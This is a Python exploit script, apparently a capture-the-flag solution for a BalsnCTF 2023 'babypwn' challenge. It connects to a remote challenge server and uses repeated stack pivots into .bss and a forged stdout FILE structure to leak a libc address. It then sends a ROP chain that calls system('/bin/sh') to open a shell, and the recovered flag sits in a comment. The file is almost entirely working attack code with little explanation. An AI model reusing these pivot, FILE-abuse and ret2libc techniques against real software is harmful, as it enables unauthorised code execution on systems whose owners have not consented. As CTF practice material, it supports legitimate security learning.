#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'babypwn2023.balsnctf.com', 'port':10105})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_main           = binf.sep_function['main']
addr_stdout         = binf.symbols['stdout']
addr_bss            = binf.sep_section['.bss']
addr_bss_stack      = addr_bss + 0xe00

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdout         = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    exploit  = b'a'*0x20
    exploit += flat(addr_bss_stack + 0x20, addr_main + 0x2a)        # 1
    conn.sendline(exploit)

    exploit  = b'b'*0x20
    exploit += flat(addr_bss_stack-0x100 + 0x20, addr_main + 0x2a)  # 2
    conn.sendlineafter(b':)\n', exploit)

    exploit  = b'c'*0x20
    exploit += flat(addr_bss_stack-0x90 + 0x20, addr_main + 0x2a)   # 3
    conn.sendlineafter(b':)\n', exploit)

    exploit  = p64(addr_main + 0x2a)                                # 7
    exploit += p64(0xdeadbeef)
    exploit += flat(addr_bss_stack-0xa8, rop.leave.address)         # 6

    exploit += flat(addr_bss_stack-0xa0 + 0x20, rop.ret.address)    # 4
    exploit += p64(rop.ret.address)*0x20
    exploit += p64(addr_main + 0x2a)                                # 5
    conn.sendlineafter(b':)\n', exploit)

    conn.sendlineafter(b':)\n', p64(rop.rbp.address)[:-1])

    '''
    _flags & _IO_NO_WRITES (0x8) == 0
    _flags & _IO_CURRENTRY_PUTTING (0x800) == 1
    _IO_write_base = _IO_read_end = target
    _IO_write_ptr = target + len
    '''
    fake_stdout  = p64(0xfbad2887)
    fake_stdout += p64(addr_main)
    fake_stdout += p64(addr_stdout)     # _IO_read_end
    fake_stdout += p64(0)
    fake_stdout += p64(addr_stdout)     # _IO_write_base
    fake_stdout += p64(addr_stdout+8)   # _IO_write_ptr
    conn.sendlineafter(b':)\n', b'd'*0x20+fake_stdout)

    addr_libc_stdout = u64(conn.recv(8))
    libc.address = addr_libc_stdout - ofs_libc_stdout
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    exploit  = b'e'*0x18
    exploit += p64(0xfbad2887)
    exploit += flat(addr_bss_stack + 0x20, addr_main + 0x8)
    conn.sendlineafter(b':)\n', exploit)

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(addr_libc_str_sh)
    rop.exit(0)

    exploit  = b'f'*0x28
    exploit += bytes(rop)
    conn.sendline(exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # BALSN{N0_CsU_1nIt_T0_c0ncTr0l_ArGs_1s_a1s0_V3ry_3asY:)}

if __name__=='__main__':
    main()

#==========
